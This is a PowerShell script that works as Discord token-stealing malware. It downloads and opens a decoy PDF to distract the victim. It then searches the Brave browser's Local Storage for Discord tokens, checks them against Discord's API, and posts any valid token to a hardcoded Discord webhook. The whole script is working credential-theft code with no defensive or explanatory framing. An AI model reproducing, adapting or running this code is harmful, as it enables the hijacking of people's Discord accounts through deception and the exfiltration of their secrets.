# ── Open decoy PDF ──
try {
    $pdfPath = "$env:TEMP\statement.pdf"
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hmm495/notes/main/statement.pdf', $pdfPath)
    Start-Process $pdfPath
} catch {}

Write-Host "[+] Scanning for Discord tokens in Brave..." -ForegroundColor Green

$localAppData = [Environment]::GetFolderPath('LocalApplicationData')
$bravePath = Join-Path $localAppData "BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"

if (-not (Test-Path $bravePath)) {
    Write-Host "[-] Brave path not found." -ForegroundColor Red
    exit
}

$tokenPattern = '[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}'
$foundToken = $null

Get-ChildItem $bravePath -File | ForEach-Object {
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content -match $tokenPattern) {
        $foundToken = $matches[0]
        Write-Host "[+] Found token candidate in $($_.Name): $foundToken" -ForegroundColor Green

        try {
            $request = [System.Net.WebRequest]::Create("https://discord.com/api/v9/users/@me")
            $request.Headers.Add("Authorization", $foundToken)
            $request.Timeout = 5000
            $response = $request.GetResponse()
            if ($response.StatusCode -eq 'OK') {
                Write-Host "[+] Token is valid!" -ForegroundColor Green
                $webhookUrl = "https://discord.com/api/webhooks/1500833396685930627/dVRUUvQjRL_llL73tLFDUKm5WeAkbC8_8zQGRcUudTTipIlLeM-Z2hIk__hwwmSE6Bje"
                $body = @{ content = "**Discord token found:** " + $foundToken } | ConvertTo-Json
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                Write-Host "[+] Token sent to webhook." -ForegroundColor Green
                break
            }
            $response.Close()
        } catch {
            Write-Host "[-] Token invalid, continuing search." -ForegroundColor Gray
        }
    }
}

if (-not $foundToken) {
    Write-Host "[-] No valid Discord token found." -ForegroundColor Red
}